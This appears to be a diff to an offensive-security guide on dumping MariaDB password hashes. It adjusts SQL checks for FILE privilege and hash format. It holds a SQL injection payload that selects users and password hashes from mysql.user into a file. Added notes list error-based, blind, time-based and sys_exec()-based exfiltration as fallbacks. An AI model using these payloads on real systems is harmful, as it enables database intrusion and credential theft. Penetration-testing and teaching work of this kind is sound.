@@ -308,16 +308,18 @@ SELECT COUNT(*) AS can_access
 FROM information_schema.schema_privileges
 WHERE table_schema = 'mysql' AND privilege_type = 'SELECT'
 
--- Query current user privileges
+-- Query current user privileges and check for FILE
 SHOW GRANTS FOR CURRENT_USER()
+-- Look for 'FILE' or 'ALL PRIVILEGES' in the output to determine FILE access
 
--- Check if FILE privilege is available (for INTO OUTFILE)
+-- Alternative: Check FILE privilege via information_schema (may miss wildcard host grants)
 SELECT COUNT(*) AS has_file
 FROM information_schema.user_privileges
 WHERE grantee = CONCAT("'", REPLACE(CURRENT_USER(), "@", "'@'"), "'")
 AND privilege_type = 'FILE'
 
--- Note: FILE privilege check may not return results if user lacks system privilege access
+-- Note: The information_schema query uses exact grantee matching, which can miss privileges
+-- granted with wildcard hosts (e.g., 'user'@'%'). SHOW GRANTS is more reliable.
 ```
 
 ### Hash Length Validation
@@ -340,8 +342,8 @@ SELECT
     ELSE 'unknown'
   END AS hash_version
 
--- Validate hash format with regex
-SELECT PASSWORD('test') REGEXP '^\\*[0-9A-F]{40}$' AS is_valid
+-- Validate hash format with regex (case-insensitive)
+SELECT PASSWORD('test') REGEXP '^\\*[0-9A-Fa-f]{40}$' AS is_valid
 -- Returns: 1
 ```
 
@@ -371,7 +373,15 @@ MariaDB supports multiple authentication plugins, but only `mysql_native_passwor
    ' UNION SELECT User, Password FROM mysql.user INTO OUTFILE '/tmp/mariadb_hashes.txt' -- -
    ```
 
-   > **Note:** `INTO OUTFILE` requires MariaDB's `secure_file_priv` system variable to allow writes to the target directory. Many modern MariaDB installations restrict this to a specific directory or disable it entirely (`secure_file_priv = NULL`). This example may not work without adjusting server configuration or having appropriate privileges.
+   > **Note:** `INTO OUTFILE` requires the FILE privilege and MariaDB's `secure_file_priv` setting to allow writes. Many modern installations set `secure_file_priv = NULL`, completely disabling file writes.
+   >
+   > **When OUTFILE is blocked, use these alternatives:**
+   >
+   > - **UNION-based extraction**: Return hashes through the application's normal output
+   > - **Error-based extraction**: Use `EXTRACTVALUE()` or `UPDATEXML()` to leak data via error messages
+   > - **Blind extraction**: Extract character-by-character using `ASCII(SUBSTRING(...))` comparisons
+   > - **Time-based extraction**: Use `IF(..., SLEEP(2), 0)` to infer data bit by bit
+   > - **DNS/HTTP exfiltration**: If UDFs are available, use `sys_exec()` to exfiltrate via network
 
 2. **Prepare hash file** (extract the password column and remove leading '\*'):
 
